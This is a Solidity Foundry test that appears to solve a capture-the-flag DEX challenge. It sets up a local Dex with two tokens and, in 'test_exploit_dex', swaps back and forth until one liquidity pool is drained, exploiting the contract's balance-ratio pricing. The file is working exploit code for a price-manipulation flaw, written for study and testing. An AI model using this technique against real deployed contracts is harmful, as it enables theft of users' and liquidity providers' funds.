// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; // ← added this

contract DexTest is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;

    address player = makeAddr("player");

    function setUp() public {
        dex = new Dex();

        token1 = new SwappableToken(address(dex), "Token1", "T1", 110);
        token2 = new SwappableToken(address(dex), "Token2", "T2", 110);

        dex.setTokens(address(token1), address(token2));

        // Add initial liquidity (100 of each token)
        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        // Give player 10 of each
        token1.transfer(player, 10);
        token2.transfer(player, 10);

        // Player approves DEX to spend their tokens
        vm.startPrank(player);
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);
        vm.stopPrank();
    }

    function test_exploit_dex() public {
        vm.startPrank(player);

        // Keep swapping back and forth until one side is drained
        while (token1.balanceOf(address(dex)) > 0 && token2.balanceOf(address(dex)) > 0) {
            // Choose direction: swap what player has → the other token
            address from = token1.balanceOf(player) > 0 ? address(token1) : address(token2);
            address to = from == address(token1) ? address(token2) : address(token1);

            uint256 playerBalance = IERC20(from).balanceOf(player);
            uint256 dexBalanceOfTo = IERC20(to).balanceOf(address(dex));

            // Calculate how much we would get
            uint256 swapPrice = dex.getSwapPrice(from, to, playerBalance);

            uint256 swapAmount = playerBalance;

            // If the calculated output > what's available → only swap what's left
            if (swapPrice > dexBalanceOfTo) {
                swapAmount = IERC20(from).balanceOf(address(dex));
            }

            dex.swap(from, to, swapAmount);
        }

        vm.stopPrank();

        // Success: at least one token pool is drained to 0
        require(
            token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0,
            "DEX should have one token drained"
        );
    }
}
